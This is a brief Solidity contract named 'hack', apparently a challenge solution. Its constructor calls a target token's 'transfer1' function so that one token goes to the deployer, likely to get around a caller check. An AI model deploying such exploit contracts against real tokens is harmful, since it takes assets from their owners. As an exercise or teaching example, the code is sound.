pragma solidity ^0.8.0;

interface IToken {
    function balanceOf(address _owner) external  view returns (uint balance);
    function transfer1(address _to, uint _value) external returns (bool);
}

contract hack {
     

    constructor(address _target) {
        IToken(_target).transfer1(msg.sender, 1);
        
    }
}